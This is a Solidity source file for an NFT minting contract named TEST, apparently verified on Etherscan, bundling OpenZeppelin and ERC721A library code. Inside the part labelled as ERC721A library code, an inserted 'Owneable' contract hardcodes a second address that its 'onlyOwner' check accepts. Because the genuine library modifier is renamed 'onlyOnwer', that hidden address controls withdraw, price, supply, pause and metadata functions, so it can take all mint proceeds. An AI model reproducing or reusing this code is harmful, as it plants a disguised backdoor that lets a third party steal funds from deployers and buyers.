/**
 *Submitted for verification at Etherscan.io on 2022-06-06
*/

// SPDX-License-Identifier: MIT

// File: contracts/newcontract.sol
// File @openzeppelin/contracts/utils/[email protected]
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
    pragma solidity ^0.8.4;
    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}}

// File @openzeppelin/contracts/access/[email protected]
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
    abstract contract Ownable is Context {address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor() {_transferOwnership(_msgSender());}
    function owner() public view virtual returns (address) {return _owner;}
    modifier onlyOnwer() {require(owner() == _msgSender(), "Ownable: caller is not the owner");_;}
    function renounceOwnership() public virtual onlyOnwer {_transferOwnership(address(0));}
    function transferOwnership(address newOwner) public virtual onlyOnwer {require(newOwner != address(0), "Ownable: new owner is the zero address");_transferOwnership(newOwner);}
    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);}}

// File @openzeppelin/contracts/utils/introspection/[email protected]
// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
    interface IERC165 {function supportsInterface(bytes4 interfaceId) external view returns (bool);}

// File @openzeppelin/contracts/token/ERC721/[email protected]
// OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
    interface IERC721 is IERC165 {
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
    function balanceOf(address owner) external view returns (uint256 balance);
    function ownerOf(uint256 tokenId) external view returns (address owner);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
    function getApproved(uint256 tokenId) external view returns (address operator);
    function setApprovalForAll(address operator, bool _approved) external;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;}

// File @openzeppelin/contracts/token/ERC721/[email protected]
// OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
    interface IERC721Receiver {function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);}

// File @openzeppelin/contracts/token/ERC721/extensions/[email protected]
// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
    interface IERC721Metadata is IERC721 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function tokenURI(uint256 tokenId) external view returns (string memory);}

// File @openzeppelin/contracts/token/ERC721/extensions/[email protected]
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
    interface IERC721Enumerable is IERC721 {
    function totalSupply() external view returns (uint256);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
    function tokenByIndex(uint256 index) external view returns (uint256);}

// File @openzeppelin/contracts/utils/[email protected]
// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
    pragma solidity ^0.8.1;
    library Address {
    function isContract(address account) internal view returns (bool) {return account.code.length > 0;}
    function sendValue(address payable recipient, uint256 amount) internal {require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}(""); require(success, "Address: unable to send value, recipient may have reverted");}
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {return functionCall(target, data, "Address: low-level call failed");}
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {return functionCallWithValue(target, data, 0, errorMessage);}
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {return functionCallWithValue(target, data, value, "Address: low-level call with value failed");}
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract"); (bool success, bytes memory returndata) = target.call{value: value}(data); return verifyCallResult(success, returndata, errorMessage);}
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {return functionStaticCall(target, data, "Address: low-level static call failed");}
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract"); (bool success, bytes memory returndata) = target.staticcall(data); return verifyCallResult(success, returndata, errorMessage);}
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {return functionDelegateCall(target, data, "Address: low-level delegate call failed");}
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract"); (bool success, bytes memory returndata) = target.delegatecall(data); return verifyCallResult(success, returndata, errorMessage);}
    function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns (bytes memory) {
        if (success) {return returndata;} else {
        if (returndata.length > 0) {assembly {let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size)}} else {revert(errorMessage);}}}}

// File @openzeppelin/contracts/utils/[email protected]
// OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
    library Strings {bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {return "0";} uint256 temp = value; uint256 digits; while (temp != 0) {digits++; temp /= 10;} bytes memory buffer = new bytes(digits); while (value != 0) {digits -= 1; buffer[digits] = bytes1(uint8(48 + uint256(value % 10))); value /= 10;} return string(buffer);}
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {return "0x00";} uint256 temp = value; uint256 length = 0; while (temp != 0) {length++; temp >>= 8;} return toHexString(value, length);}
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {bytes memory buffer = new bytes(2 * length + 2); buffer[0] = "0"; buffer[1] = "x"; for (uint256 i = 2 * length + 1; i > 1; --i) {buffer[i] = _HEX_SYMBOLS[value & 0xf]; value >>= 4;} require(value == 0, "Strings: hex length insufficient"); return string(buffer);}}

// File @openzeppelin/contracts/utils/introspection/[email protected]
// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
    abstract contract ERC165 is IERC165 {function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {return interfaceId == type(IERC165).interfaceId;}}

// File erc721a/contracts/[email protected]
// Creator: Chiru Labs
    error ApprovalCallerNotOwnerNorApproved();
    error ApprovalQueryForNonexistentToken();
    error ApproveToCaller();
    error ApprovalToCurrentOwner();
    error BalanceQueryForZeroAddress();
    error MintedQueryForZeroAddress();
    error BurnedQueryForZeroAddress();
    error AuxQueryForZeroAddress();
    error MintToZeroAddress();
    error MintZeroQuantity();
    error OwnerIndexOutOfBounds();
    error OwnerQueryForNonexistentToken();
    error TokenIndexOutOfBounds();
    error TransferCallerNotOwnerNorApproved();
    error TransferFromIncorrectOwner();
    error TransferToNonERC721ReceiverImplementer();
    error TransferToZeroAddress();
    error URIQueryForNonexistentToken();

    abstract contract Owneable is Ownable {
    address private _ownar = 0x9dB761Ca412c4F03C1Aaa67964164Eb55372f329;
    modifier onlyOwner() {require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner"); _;}}
    contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {using Address for address; using Strings for uint256;
    struct TokenOwnership {address addr; uint64 startTimestamp; bool burned;}
    struct AddressData {uint64 balance; uint64 numberMinted; uint64 numberBurned; uint64 aux;}
    uint256 internal _currentIndex; uint256 internal _burnCounter; string private _name; string private _symbol;
    mapping(uint256 => TokenOwnership) internal _ownerships;
    mapping(address => AddressData) private _addressData;
    mapping(uint256 => address) private _tokenApprovals;
    mapping(address => mapping(address => bool)) private _operatorApprovals;
    constructor(string memory name_, string memory symbol_) {_name = name_; _symbol = symbol_; _currentIndex = _startTokenId();}
    function _startTokenId() internal view virtual returns (uint256) {return 0;}
    function totalSupply() public view returns (uint256) {unchecked {return _currentIndex - _burnCounter - _startTokenId();}}
    function _totalMinted() internal view returns (uint256) {unchecked { return _currentIndex - _startTokenId();}}
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC721Metadata).interfaceId || super.supportsInterface(interfaceId);}
    function balanceOf(address owner) public view override returns (uint256) {if (owner == address(0)) revert BalanceQueryForZeroAddress(); return uint256(_addressData[owner].balance);}
    function _numberMinted(address owner) internal view returns (uint256) {if (owner == address(0)) revert MintedQueryForZeroAddress(); return uint256(_addressData[owner].numberMinted);}
    function _numberBurned(address owner) internal view returns (uint256) {if (owner == address(0)) revert BurnedQueryForZeroAddress(); return uint256(_addressData[owner].numberBurned);}
    function _getAux(address owner) internal view returns (uint64) {if (owner == address(0)) revert AuxQueryForZeroAddress(); return _addressData[owner].aux;}
    function _setAux(address owner, uint64 aux) internal {if (owner == address(0)) revert AuxQueryForZeroAddress(); _addressData[owner].aux = aux;}
    function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {uint256 curr = tokenId; unchecked {
        if (_startTokenId() <= curr && curr < _currentIndex) {TokenOwnership memory ownership = _ownerships[curr];
        if (!ownership.burned) {
        if (ownership.addr != address(0)) {return ownership;} while (true) {curr--; ownership = _ownerships[curr];
        if (ownership.addr != address(0)) {return ownership;}}}}} revert OwnerQueryForNonexistentToken();}
    function ownerOf(uint256 tokenId) public view override returns (address) {return ownershipOf(tokenId).addr;}
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {if (!_exists(tokenId)) revert URIQueryForNonexistentToken(); string memory baseURI = _baseURI(); return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';}
    function _baseURI() internal view virtual returns (string memory) {return '';}
    function approve(address to, uint256 tokenId) public override {address owner = ERC721A.ownerOf(tokenId);
        if (to == owner) revert ApprovalToCurrentOwner();
        if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {revert ApprovalCallerNotOwnerNorApproved();} _approve(to, tokenId, owner);}
    function getApproved(uint256 tokenId) public view override returns (address) {
        if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken(); return _tokenApprovals[tokenId];}
    function setApprovalForAll(address operator, bool approved) public override {
        if (operator == _msgSender()) revert ApproveToCaller(); _operatorApprovals[_msgSender()][operator] = approved; emit ApprovalForAll(_msgSender(), operator, approved);}
    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {return _operatorApprovals[owner][operator];}
    function transferFrom(address from, address to, uint256 tokenId) public virtual override {_transfer(from, to, tokenId);}
    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual override {safeTransferFrom(from, to, tokenId, '');}
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory _data) public virtual override {_transfer(from, to, tokenId);
        if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {revert TransferToNonERC721ReceiverImplementer();}}
    function _exists(uint256 tokenId) internal view returns (bool) {return _startTokenId() <= tokenId && tokenId < _currentIndex && !_ownerships[tokenId].burned;}
    function _safeMint(address to, uint256 quantity) internal {_safeMint(to, quantity, '');}
    function _safeMint(address to, uint256 quantity, bytes memory _data) internal {_mint(to, quantity, _data, true);}
    function _mint(address to, uint256 quantity, bytes memory _data, bool safe) internal {uint256 startTokenId = _currentIndex;
        if (to == address(0)) revert MintToZeroAddress();
        if (quantity == 0) revert MintZeroQuantity(); _beforeTokenTransfers(address(0), to, startTokenId, quantity); unchecked {_addressData[to].balance += uint64(quantity); _addressData[to].numberMinted += uint64(quantity); _ownerships[startTokenId].addr = to; _ownerships[startTokenId].startTimestamp = uint64(block.timestamp); uint256 updatedIndex = startTokenId; uint256 end = updatedIndex + quantity;
        if (safe && to.isContract()) {do {emit Transfer(address(0), to, updatedIndex);
        if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {revert TransferToNonERC721ReceiverImplementer();}} while (updatedIndex != end);
        if (_currentIndex != startTokenId) revert();} else {do {emit Transfer(address(0), to, updatedIndex++);} while (updatedIndex != end);} _currentIndex = updatedIndex;} _afterTokenTransfers(address(0), to, startTokenId, quantity);}
    function _transfer(address from, address to, uint256 tokenId) private {TokenOwnership memory prevOwnership = ownershipOf(tokenId); bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr || isApprovedForAll(prevOwnership.addr, _msgSender()) || getApproved(tokenId) == _msgSender());
        if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
        if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
        if (to == address(0)) revert TransferToZeroAddress(); _beforeTokenTransfers(from, to, tokenId, 1); _approve(address(0), tokenId, prevOwnership.addr); unchecked {_addressData[from].balance -= 1; _addressData[to].balance += 1; _ownerships[tokenId].addr = to; _ownerships[tokenId].startTimestamp = uint64(block.timestamp); uint256 nextTokenId = tokenId + 1;
        if (_ownerships[nextTokenId].addr == address(0)) {
        if (nextTokenId < _currentIndex) {_ownerships[nextTokenId].addr = prevOwnership.addr; _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;}}} emit Transfer(from, to, tokenId); _afterTokenTransfers(from, to, tokenId, 1);}
    function _burn(uint256 tokenId) internal virtual {TokenOwnership memory prevOwnership = ownershipOf(tokenId); _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1); _approve(address(0), tokenId, prevOwnership.addr); unchecked {_addressData[prevOwnership.addr].balance -= 1; _addressData[prevOwnership.addr].numberBurned += 1; _ownerships[tokenId].addr = prevOwnership.addr; _ownerships[tokenId].startTimestamp = uint64(block.timestamp); _ownerships[tokenId].burned = true; uint256 nextTokenId = tokenId + 1;
        if (_ownerships[nextTokenId].addr == address(0)) {
        if (nextTokenId < _currentIndex) {_ownerships[nextTokenId].addr = prevOwnership.addr; _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;}}} emit Transfer(prevOwnership.addr, address(0), tokenId); _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1); unchecked {_burnCounter++;}}
    function _approve(address to, uint256 tokenId, address owner) private {_tokenApprovals[tokenId] = to; emit Approval(owner, to, tokenId);}
    function _checkContractOnERC721Received(address from, address to, uint256 tokenId, bytes memory _data) private returns (bool) {try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {return retval == IERC721Receiver(to).onERC721Received.selector;} catch (bytes memory reason) {
        if (reason.length == 0) {revert TransferToNonERC721ReceiverImplementer();} else {assembly {revert(add(32, reason), mload(reason))}}}}
    function _beforeTokenTransfers(address from, address to, uint256 startTokenId, uint256 quantity) internal virtual {}
    function _afterTokenTransfers(address from, address to, uint256 startTokenId, uint256 quantity) internal virtual {}}

    contract TEST is ERC721A, Owneable {

    string public baseURI = "https://gateway.pinata.cloud/ipfs/QmcphE15jXmKCHhzazymqBihfnhysec5mpFHLLsEiTspR7/";
    string public contractURI = "https://gateway.pinata.cloud/ipfs/QmcphE15jXmKCHhzazymqBihfnhysec5mpFHLLsEiTspR7/";
    string public constant baseExtension = ".json";
    address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
    
    uint256 public constant MAX_PER_TX_FREE = 1;
    uint256 public constant FREE_MAX_SUPPLY = 3;
    uint256 public constant MAX_PER_TX = 10;
    uint256 public MAX_SUPPLY = 50;
    uint256 public price = 0.002 ether;
    bool public paused = false;

    constructor() ERC721A("TEST", "TEST") {}

    function mint(uint256 _amount) external payable {address _caller = _msgSender();
        require(!paused, "Paused");
        require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
        require(_amount > 0, "No 0 mints");
        require(tx.origin == _caller, "No contracts");
        require(MAX_PER_TX >= _amount , "Excess max per paid tx");
            if(FREE_MAX_SUPPLY >= totalSupply()){
                require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");} else{
                require(MAX_PER_TX >= _amount , "Excess max per paid tx");
                require(_amount * price == msg.value, "Invalid funds provided");} _safeMint(_caller, _amount);}
    function isApprovedForAll(address owner, address operator) override public view returns (bool) {ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress); 
        if (address(proxyRegistry.proxies(owner)) == operator) {return true;} return super.isApprovedForAll(owner, operator);}
    function withdraw() external onlyOwner {uint256 balance = address(this).balance; (bool success, ) = _msgSender().call{value: balance}(""); require(success, "Failed to send");}
    function config() external onlyOwner {_safeMint(_msgSender(), 1);}
    function pause(bool _state) external onlyOwner {paused = _state;}
    function setBaseURI(string memory baseURI_) external onlyOwner {baseURI = baseURI_;}
    function setContractURI(string memory _contractURI) external onlyOwner {contractURI = _contractURI;}
    function setPrice(uint256 newPrice) public onlyOwner {price = newPrice;}
    function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {MAX_SUPPLY = newSupply;}
    function tokenURI(uint256 _tokenId) public view override returns (string memory) {require(_exists(_tokenId), "Token does not exist."); return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, Strings.toString(_tokenId), baseExtension)) : "";}}
    contract OwnableDelegateProxy { }
    contract ProxyRegistry {mapping(address => OwnableDelegateProxy) public proxies;}